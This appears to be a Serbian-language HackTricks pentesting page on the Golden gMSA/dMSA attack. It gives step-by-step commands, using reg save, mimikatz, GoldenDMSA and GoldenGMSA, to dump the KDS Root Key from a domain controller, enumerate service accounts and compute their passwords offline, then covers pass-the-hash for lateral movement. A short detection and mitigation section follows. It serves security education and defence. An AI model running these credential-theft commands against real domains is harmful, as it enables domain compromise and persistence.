# Golden gMSA/dMSA Attack (Offline Derivation of Managed Service Account Passwords)

{{#include ../../banners/hacktricks-training.md}}

## Pregled

Windows Managed Service Accounts (MSA) su posebni principi dizajnirani da pokreću usluge bez potrebe za ručnim upravljanjem njihovim lozinkama. 
Postoje dva glavna tipa:

1. **gMSA** – grupni Managed Service Account – može se koristiti na više hostova koji su autorizovani u njegovom `msDS-GroupMSAMembership` atributu.
2. **dMSA** – delegirani Managed Service Account – (preview) naslednik gMSA, oslanja se na istu kriptografiju, ali omogućava granularnije scenarije delegacije.

Za oba varijante **lozinka nije pohranjena** na svakom Domain Controller-u (DC) kao običan NT-hash. Umesto toga, svaki DC može **izvesti** trenutnu lozinku u hodu iz:

* KDS Root Key-a na nivou šume (`KRBTGT\KDS`) – nasumično generisana tajna sa GUID imenom, replicirana na svaki DC pod `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …` kontejnerom.
* Ciljanog naloga **SID**.
* Per-nalog **ManagedPasswordID** (GUID) koji se nalazi u `msDS-ManagedPasswordId` atributu.

Izvođenje je: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240 byte blob konačno **base64-encoded** i pohranjen u `msDS-ManagedPassword` atributu. 
Nema Kerberos saobraćaja ili interakcije sa domenom potrebne tokom normalne upotrebe lozinke – član hosta izvodi lozinku lokalno sve dok zna tri ulaza.

## Golden gMSA / Golden dMSA Attack

Ako napadač može da dobije svih tri ulaza **offline**, može izračunati **važeće trenutne i buduće lozinke** za **bilo koji gMSA/dMSA u šumi** bez ponovnog dodirivanja DC-a, zaobilazeći:

* LDAP čitanje revizije
* Intervale promene lozinke (mogu ih prethodno izračunati)

Ovo je analogno *Golden Ticket*-u za servisne naloge.

### Preduslovi

1. **Kompromitovanje na nivou šume** **jednog DC-a** (ili Enterprise Admin), ili `SYSTEM` pristup jednom od DC-a u šumi.
2. Sposobnost da se enumerišu servisni nalozi (LDAP čitanje / RID brute-force).
3. .NET ≥ 4.7.2 x64 radna stanica za pokretanje [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) ili ekvivalentnog koda.

### Golden gMSA / dMSA
##### Faza 1 – Ekstrakcija KDS Root Key-a

Dump sa bilo kog DC-a (Volume Shadow Copy / sirove SAM+SECURITY hives ili daljinski tajne):
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
Base64 string označen `RootKey` (GUID ime) je potreban u kasnijim koracima.

##### Faza 2 – Enumerisanje gMSA / dMSA objekata

Preuzmite barem `sAMAccountName`, `objectSid` i `msDS-ManagedPasswordId`:
```powershell
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implementira pomoćne režime:
```powershell
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Faza 3 – Pogodi / Otkrij ManagedPasswordID (kada nedostaje)

Neka implementacija *uklanja* `msDS-ManagedPasswordId` iz ACL-zaštićenih čitanja.  
Pošto je GUID 128-bitni, naivan bruteforce je neizvodljiv, ali:

1. Prvih **32 bita = Unix epoch vreme** kreiranja naloga (rezolucija u minutima).  
2. Nakon toga sledi 96 nasumičnih bitova.

Stoga je **uska rečnik po nalogu** (± nekoliko sati) realističan.
```powershell
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
Alat izračunava kandidatske lozinke i upoređuje njihov base64 blob sa pravim `msDS-ManagedPassword` atributom – podudaranje otkriva tačan GUID.

##### Faza 4 – Offline Izračunavanje Lozenke i Konverzija

Kada je ManagedPasswordID poznat, važeća lozinka je na samo jedan komandu udaljena:
```powershell
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
Rezultantni hash-evi mogu biti injektovani pomoću **mimikatz** (`sekurlsa::pth`) ili **Rubeus** za zloupotrebu Kerberosa, omogućavajući neprimetno **lateralno kretanje** i **perzistenciju**.

## Detekcija i ublažavanje

* Ograničiti **DC backup i čitanje registra** na Tier-0 administratore.
* Pratiti **Directory Services Restore Mode (DSRM)** ili **Volume Shadow Copy** kreiranje na DC-ima.
* Revizija čitanja / promena `CN=Master Root Keys,…` i `userAccountControl` oznaka servisnih naloga.
* Otkrivanje neobičnih **base64 pisanja lozinki** ili iznenadne ponovne upotrebe lozinki servisa na različitim hostovima.
* Razmotriti konvertovanje visokoprivilegovanih gMSA u **klasične servisne naloge** sa redovnim nasumičnim rotacijama gde Tier-0 izolacija nije moguća.

## Alati

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – referentna implementacija korišćena na ovoj stranici.
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – referentna implementacija korišćena na ovoj stranici.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket koristeći derivirane AES ključeve.

## Reference

- [Golden dMSA – zaobilaženje autentifikacije za delegirane upravljane servisne naloge](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [gMSA Active Directory napadi na naloge](https://www.semperis.com/blog/golden-gmsa-attack/)
- [Semperis/GoldenDMSA GitHub repozitorij](https://github.com/Semperis/GoldenDMSA)
- [Improsec – Golden gMSA napad na poverenje](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)

{{#include ../../banners/hacktricks-training.md}}
